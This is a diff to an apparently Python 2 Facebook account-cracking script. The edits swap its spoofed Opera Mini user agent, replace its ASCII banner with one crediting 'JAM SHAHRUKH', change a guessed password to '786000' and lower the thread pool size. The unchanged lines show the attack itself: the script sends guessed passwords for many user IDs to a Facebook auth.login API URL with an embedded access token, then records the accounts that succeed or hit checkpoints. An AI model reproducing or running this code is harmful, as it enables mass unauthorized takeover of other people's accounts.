@@ -17,7 +17,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/7.6.35766/35.5706; U; en) Presto/2.8.119 Version/11.10')]
 
 
 def keluar():
@@ -51,19 +51,12 @@ def jalan(z):
 ##### INTRO #####
 logo ="""
 
-\x1b[1;91m██████████████████████████████████████████████████████
-\x1b[1;92m█████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█
-\x1b[1;92m█████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▀▒▒█
-\x1b[1;92m█████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▒▒█
-\x1b[1;92m█████████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
-\x1b[1;92m█████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█
-\x1b[1;92m█████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█
-\x1b[1;92m█▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▒▒▒▒██▒▒▄▀▒▒█
-\x1b[1;92m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█
-\x1b[1;92m█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█
-\x1b[1;92m█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█
-\x1b[1;92m█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█
-\x1b[1;91m██████████████████████████████████████████████████████
+\x1b[1;96m░░░░░██╗░█████╗░███╗░░░███╗
+\x1b[1;96m░░░░░██║██╔══██╗████╗░████║
+\x1b[1;96m░░░░░██║███████║██╔████╔██║
+\x1b[1;96m██╗░░██║██╔══██║██║╚██╔╝██║
+\x1b[1;96m╚█████╔╝██║░░██║██║░╚═╝░██║
+\x1b[1;96m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
 \x1b[1;97m--------------------------------------------------------------
 \x1b[1;94m➣  YouTube  : JAM SHAHRUKH TECHNICAL
 \x1b[1;94m➣  Facebook : JAM SHAHRUKH
@@ -401,7 +394,7 @@ def pilih_super():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
-																	pass8 = '123123'
+																	pass8 = '786000'
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                         q = json.load(data)
 																	if 'access_token' in q:
@@ -420,7 +413,7 @@ def pilih_super():
 		except:
 			pass
 		
-	p = ThreadPool(50)
+	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m---------------------------------------------------"
 	
